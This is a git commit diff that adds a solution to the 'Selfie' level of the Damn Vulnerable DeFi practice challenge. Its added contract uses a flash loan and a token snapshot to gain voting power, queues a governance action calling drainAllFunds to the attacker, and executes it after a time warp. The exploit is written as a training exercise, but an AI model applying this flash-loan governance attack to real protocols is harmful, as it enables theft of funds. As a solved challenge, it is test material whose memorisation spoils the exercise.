c2d4080bc8d94584bbcd595717f032f8e26d4645
0xfarhaan <farhaan@maple.finance>
2022-11-12 21:02:23 +0000

    feat: Selfie exploit

--- test/Levels/selfie/Selfie.t.sol
+++ test/Levels/selfie/Selfie.t.sol
@@ -8,6 +8,38 @@ import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableToke
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
 
+contract AttackSelfie {
+
+    address public attacker;
+
+    uint256 public actionId;
+
+    SimpleGovernance public governance;
+    SelfiePool public pool;
+
+    constructor(address _attacker, address _governance, address _pool) {
+        attacker = _attacker;
+        governance = SimpleGovernance(_governance);
+        pool = SelfiePool(_pool);
+    }
+
+    function attack(DamnValuableTokenSnapshot tokenAddress_) public {
+        pool.flashLoan(tokenAddress_.balanceOf(address(pool)));
+    }
+
+    function receiveTokens(address token_, uint256 amount_) public {
+        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(token_);
+        token.snapshot();
+        bytes memory data_ = abi.encodeWithSignature("drainAllFunds(address)", address(attacker));
+        actionId = governance.queueAction(address(pool), data_, 0);
+        token.transfer(address(pool), amount_);
+    }
+
+    function finishAttack() public {
+        governance.executeAction(actionId);
+    }
+}
+
 contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
     uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;
@@ -45,6 +77,16 @@ contract Selfie is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+
+        // Note: This is an example of using a flash loan to game governance to setup an attack
+        // where the tx is ACL'd by the governance contract
+
+        AttackSelfie attack = new AttackSelfie(address(attacker), address(simpleGovernance), address(selfiePool));
+        attack.attack(dvtSnapshot);
+
+        vm.warp(2 days + 1 seconds);
+
+        attack.finishAttack();
 
         /** EXPLOIT END **/
         validation();
